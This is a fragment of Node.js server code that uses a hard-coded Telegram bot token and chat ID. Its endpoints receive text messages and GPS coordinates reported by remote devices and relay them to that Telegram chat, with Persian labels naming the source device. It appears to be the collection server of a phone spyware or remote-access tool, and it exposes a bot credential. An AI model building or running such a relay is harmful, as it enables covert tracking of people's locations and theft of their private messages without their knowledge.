...
const token = '8003094248:AAEeKI7B4jFw-F7OmRk-RgFEs5UZvhFT0mY'
const id = '7211255374'
...
app.post("/uploadText", (req, res) => {
    appBot.sendMessage(id, `°• پیام از <b>${req.headers.model}</b> دستگاه\n\n` + req.body['text'], {parse_mode: "HTML"})
    res.send('')
})
app.post("/uploadLocation", (req, res) => {
    appBot.sendLocation(id, req.body['lat'], req.body['lon'])
    appBot.sendMessage(id, `°• لوکیشن از <b>${req.headers.model}</b> دستگاه`, {parse_mode: "HTML"})
    res.send('')
})
